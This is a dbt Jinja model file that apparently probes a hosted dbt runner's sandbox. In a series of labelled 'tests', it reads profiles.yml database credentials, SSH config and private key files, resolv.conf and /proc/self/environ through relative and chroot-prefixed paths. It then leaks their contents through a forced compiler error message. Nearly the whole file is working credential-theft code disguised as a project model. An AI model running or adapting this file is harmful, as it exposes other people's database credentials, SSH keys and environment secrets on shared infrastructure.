{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
{% set ns = namespace(output='[FILE_v3] ') %}

{# Test 1: Read a file we KNOW exists in the project - dbt_project.yml #}
{% set proj = load_file_contents('dbt_project.yml') %}
{% if proj %}
  {% set ns.output = ns.output ~ 'PROJECT_FILE=YES(' ~ proj | length ~ 'b)' %}
{% else %}
  {% set ns.output = ns.output ~ 'PROJECT_FILE=NO' %}
{% endif %}

{# Test 2: Relative path to profiles.yml #}
{% set p1 = load_file_contents('../.dbt/profiles.yml') %}
{% set p2 = load_file_contents('../../.dbt/profiles.yml') %}
{% set p3 = load_file_contents('/restricted-chroot/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml') %}
{% set ns.output = ns.output ~ ' | REL1=' ~ (p1 | length) ~ 'b | REL2=' ~ (p2 | length) ~ 'b | CHROOT=' ~ (p3 | length) ~ 'b' %}

{# If any profiles.yml found, show content #}
{% if p1 %}
  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p1[:800] %}
{% elif p2 %}
  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p2[:800] %}
{% elif p3 %}
  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p3[:800] %}
{% endif %}

{# Test 3: SSH config relative #}
{% set s1 = load_file_contents('../.ssh/config') %}
{% set s2 = load_file_contents('../.ssh/id_rsa') %}
{% set ns.output = ns.output ~ ' | SSH_CFG=' ~ (s1 | length) ~ 'b | SSH_KEY=' ~ (s2 | length) ~ 'b' %}
{% if s1 %}
  {% set ns.output = ns.output ~ ' | SSH_CFG_CONTENT=' ~ s1[:300] %}
{% endif %}
{% if s2 %}
  {% set ns.output = ns.output ~ ' | SSH_KEY_CONTENT=' ~ s2[:300] %}
{% endif %}

{# Test 4: /etc files with chroot prefix #}
{% set r1 = load_file_contents('/restricted-chroot/etc/resolv.conf') %}
{% set r2 = load_file_contents('/etc/resolv.conf') %}
{% set ns.output = ns.output ~ ' | RESOLV_CHROOT=' ~ (r1 | length) ~ 'b | RESOLV_DIRECT=' ~ (r2 | length) ~ 'b' %}

{# Test 5: /proc via chroot #}
{% set e1 = load_file_contents('/restricted-chroot/proc/self/environ') %}
{% set ns.output = ns.output ~ ' | ENVIRON_CHROOT=' ~ (e1 | length) ~ 'b' %}

{{ exceptions.raise_compiler_error(ns.output) }}
